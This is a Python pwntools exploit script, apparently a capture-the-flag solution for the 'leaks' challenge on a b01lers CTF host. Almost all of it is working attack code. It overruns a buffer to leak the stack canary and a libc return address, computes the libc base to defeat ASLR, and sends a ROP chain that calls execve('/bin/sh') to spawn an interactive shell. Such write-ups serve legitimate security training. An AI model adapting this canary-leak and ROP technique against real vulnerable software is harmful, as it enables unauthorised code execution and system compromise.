#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host chal.ctf.b01lers.com --port 1009 leaks
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('leaks')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'chal.ctf.b01lers.com'
port = int(args.PORT or 1009)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

if args.LOCAL:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    libc = ELF("leaks-libc")

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x555555555340
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

#  context.aslr = False
#  context.log_level = "DEBUG"
io = start()

# Setup name (maybe we'll use it later?)
io.sendline("16")
io.sendline("A"*16)
io.clean()

# Fill buffer to the max so it leaks canary right after
io.sendline("24")
io.sendline("B"*24) # newline overwrites lowers 0-byte of canary
io.recvuntil("B\n")
cookie = int.from_bytes(io.recv()[:7], "little") << 8
log.info("Cookie: " + hex(cookie))
io.clean()

# Overwrite buffer, cookie, and RBP (32-bytes) to leak return address to
# __libc_start_main Locally the offset is 234 and remotely it's not, but it's
# close enough so we cheat and just clear the lower 3 nibbles to make things
# work.
io.sendline(str(32-1)) # -1 so the newline doesn't break the leak
io.sendline("C"*(32-1))
io.recvuntil("C\n")
leak_libc_ret = int.from_bytes(io.recv(), "little")
libc_start_main = leak_libc_ret - 234
libc.address = libc_start_main - libc.symbols['__libc_start_main']
libc.address = libc.address & 0xfffffffff000
log.info("Libc base: " + hex(libc.address))

# With the leaks out of the way, do the ROP!
r = ROP(libc)
r.execve(next(libc.search(b"/bin/sh")), 0, 0)
p = b"A"*24
p += pack(cookie)
p += b"BBBBBBBB" # rbp
p += r.chain()
io.sendline(str(len(p)))
io.sendline(p)

io.interactive()
